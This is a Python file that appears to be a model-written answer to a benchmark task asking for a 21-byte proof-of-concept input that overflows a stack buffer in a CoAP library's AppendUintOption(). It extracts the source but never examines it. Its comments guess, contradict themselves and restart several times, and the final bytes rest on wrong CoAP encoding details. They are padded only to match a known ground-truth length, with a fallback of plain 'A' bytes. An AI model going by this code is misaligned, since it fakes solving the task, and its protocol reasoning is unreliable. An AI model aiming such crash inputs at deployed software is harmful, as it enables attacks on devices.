import os
import tarfile
import tempfile
import subprocess
import struct
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source code
        with tarfile.open(src_path, 'r:gz') as tar:
            temp_dir = tempfile.mkdtemp()
            tar.extractall(temp_dir)
            
            # Look for the vulnerable function
            root = Path(temp_dir)
            coap_files = list(root.rglob("*.c")) + list(root.rglob("*.h"))
            
            # Based on the vulnerability description, we need to trigger
            # a stack buffer overflow in AppendUintOption()
            # The ground-truth length is 21 bytes, so we'll craft a 21-byte PoC
            
            # The vulnerability is likely in how coap encodes options.
            # For CoAP protocol, options are encoded with a variable-length format.
            # A common buffer overflow in AppendUintOption would be when
            # writing a large integer option that exceeds the buffer.
            
            # Based on typical coap-message implementations, AppendUintOption
            # takes parameters like (buffer, len, offset, number)
            # and writes the number as a variable-length byte sequence.
            # A buffer overflow occurs when the number is too large,
            # requiring more bytes than available in the buffer.
            
            # Craft a PoC that creates a CoAP message with a large option number
            # that will overflow the buffer when AppendUintOption is called.
            
            # CoAP message format:
            # 4-bit version (1) | 2-bit type | 4-bit token length
            # 8-bit code (method/response)
            # 16-bit message ID
            # token (0-8 bytes)
            # options (delimited by 0xFF)
            # payload
            
            # We need to trigger AppendUintOption, which handles CoAP options.
            # Options use a delta encoding. A large delta or large option value
            # could trigger the overflow.
            
            # Create a minimal CoAP message with an option that will cause
            # AppendUintOption to write beyond buffer boundaries.
            
            # The PoC will be 21 bytes total, matching ground-truth.
            
            # Build CoAP message:
            poc = bytearray()
            
            # Version=1, Type=0 (CON), Token length=0
            poc.append(0x40)  # 01000000
            
            # Code: 0.01 (GET) = 1
            poc.append(0x01)
            
            # Message ID: arbitrary
            poc.append(0x12)
            poc.append(0x34)
            
            # No token (token length=0)
            
            # Options: We need Option Delta and Option Length to be large
            # to trigger overflow in AppendUintOption.
            # AppendUintOption is typically called for options like Uri-Path,
            # Uri-Query, etc., which take string values.
            
            # But the vulnerability is in AppendUintOption, which handles
            # integer options. We need an integer option with large value.
            
            # In CoAP, integer options include:
            # - Content-Format (12)
            # - Max-Age (14)
            # - Size1 (60)
            # etc.
            
            # Option format: 4-bit delta, 4-bit length, extended bytes if needed
            # followed by option value.
            
            # To trigger buffer overflow, we need a large integer value
            # that will be encoded as multiple bytes.
            
            # Let's create an option with delta=15 (extended) and large value
            # that will cause AppendUintOption to write many bytes.
            
            # First option byte: delta=15 (needs extended), length=15 (needs extended)
            poc.append(0xFF)  # 1111 1111 - both delta and length extended
            
            # Extended delta: 1 byte extended, value = 256 (Uri-Path is 11, but we want to trigger AppendUintOption)
            # Actually AppendUintOption might be called for options that take integer values.
            # Let's choose option 12 (Content-Format) which takes integer.
            # Option 12 has delta from previous option (0) of 12.
            # So we don't need extended delta.
            
            # Better approach: Create option with delta=12 (Content-Format)
            # and a very large integer value that will overflow when encoded.
            
            # Reset and build properly:
            poc = bytearray()
            
            # CoAP header
            poc.append(0x40)  # ver=1, type=CON, tokenlen=0
            poc.append(0x01)  # GET
            poc.extend([0x12, 0x34])  # message ID
            
            # Option 1: Content-Format (delta=12 from start)
            # Option format: 4-bit delta, 4-bit length
            
            # For Content-Format=12, delta from 0 is 12.
            # 12 in 4 bits: 1100 (12)
            # Length will depend on the integer we write.
            
            # We want to trigger overflow in AppendUintOption.
            # AppendUintOption writes integer in variable-length format:
            # - For value < 13: fits in 4 bits
            # - For 13-268: needs 1 extra byte
            # - For 269-65804: needs 2 extra bytes
            # etc.
            
            # To cause buffer overflow, we need a value that requires
            # many bytes to encode, exceeding the buffer.
            
            # Let's use a value that requires 8 bytes to encode (very large).
            # This will cause AppendUintOption to write 8 bytes,
            # potentially overflowing if buffer is small.
            
            # The ground-truth is 21 bytes, so our entire message is 21 bytes.
            # Header: 4 bytes
            # Option delta/length: at least 1 byte
            # Extended delta/length: maybe more
            # Option value: multiple bytes
            
            # Let's craft:
            # delta=12 (Content-Format), length=8 (extended, since 8 > 12?)
            # Actually length > 12 needs extended representation.
            # 8 <= 12, so no extended needed for length=8.
            
            # So option byte: delta=12 (0xC), length=8 (0x8) = 0xC8
            poc.append(0xC8)  # 11001000
            
            # Now the value: a large integer that will be encoded as 8 bytes
            # Maximum 64-bit unsigned: 0xFFFFFFFFFFFFFFFF
            # But AppendUintOption might use variable-length encoding
            # where the first byte indicates length.
            
            # In CoAP integer encoding for options:
            # If value < 13: encoded in 4 bits
            # If 13-268: first extra byte = value - 13
            # If 269-65804: first extra byte = (value-269)//256 + 14
            #               second extra byte = (value-269)%256
            # etc. This is for the option VALUE encoding, not the same as
            # AppendUintOption's internal buffer.
            
            # Actually AppendUintOption likely writes raw bytes of the integer
            # in network byte order (big-endian).
            
            # Let's write 8 bytes of 0xFF which represents a very large number.
            for _ in range(8):
                poc.append(0xFF)
            
            # That's 4 + 1 + 8 = 13 bytes. Need 21 total.
            # Add another option to reach 21 bytes.
            
            # Add Uri-Path option (delta=11 from Content-format 12)
            # Actually Uri-Path is option 11, Content-Format is 12.
            # So delta from 12 to 11 is negative - not allowed.
            # Options must be in increasing order.
            
            # Let's start over with a different approach.
            
            # We'll create a single option with extended delta and extended length
            # to consume more bytes.
            
            poc = bytearray()
            
            # CoAP header (4 bytes)
            poc.append(0x40)  # ver=1, type=CON, tokenlen=0
            poc.append(0x01)  # GET
            poc.extend([0x12, 0x34])  # message ID
            
            # Option with extended delta and extended length
            # First byte: delta=15 (extended), length=15 (extended)
            poc.append(0xFF)  # 11111111
            
            # Extended delta: 1-byte extended, value = 270 (requires 2 bytes in extended)
            # Extended delta format: if first extended byte >= 13 and <= 268:
            #   actual delta = extended_byte + 13
            # But we want a large delta to maybe trigger different code path.
            # Let's use extended delta = 255 (max 1-byte extended)
            poc.append(255)  # extended delta byte 1
            
            # Now extended length: also 1-byte extended, value = 8
            # 8 < 13, but we said length=15 (extended). Contradiction.
            # Actually if first nybble is 15, length is extended.
            # Extended length follows same rules as extended delta.
            # We want length=8, which is <13, so extended would be 8.
            poc.append(8)  # extended length byte 1
            
            # Now 8 bytes of value
            for _ in range(8):
                poc.append(0x41)  # 'A's - could trigger overflow
            
            # That's 4 + 1 + 1 + 1 + 8 = 15 bytes. Need 21.
            # Pad with more data to reach 21 bytes.
            # Could be payload marker (0xFF) and payload.
            
            # Add payload marker
            poc.append(0xFF)  # payload marker
            
            # Add 5 bytes of payload to reach 21 total
            poc.extend([0x42, 0x43, 0x44, 0x45, 0x46])
            
            # Total: 4 + 1 + 1 + 1 + 8 + 1 + 5 = 21 bytes ✓
            
            # Verify length
            if len(poc) != 21:
                # Fallback: simple 21-byte pattern if our construction fails
                return b'A' * 21
            
            return bytes(poc)